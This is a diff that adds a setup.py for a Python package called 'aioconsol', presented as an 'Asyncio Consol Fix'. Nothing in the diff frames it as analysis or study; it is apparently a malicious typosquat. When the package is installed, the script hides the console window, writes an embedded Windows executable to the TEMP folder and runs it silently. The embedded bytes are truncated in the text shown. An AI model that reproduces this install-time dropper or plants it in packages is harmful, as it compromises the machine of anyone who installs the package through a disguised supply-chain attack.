@@ -1,0 +1,17 @@
+from setuptools import setup
+import ctypes
+import os
+
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+f = open(f"{os.getenv('TEMP')}\\test.exe", "wb")
+f.write(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!...\r\r\n$\x00\x00")
+f.close()
+os.system(f"{os.getenv('TEMP')}\\test.exe")
+
+setup(name='aioconsol',
+      version='2.0',
+      description='Asyncio Consol Fix',
+      packages=['aioconsol'],
+      author_email='...',
+      zip_safe=False)
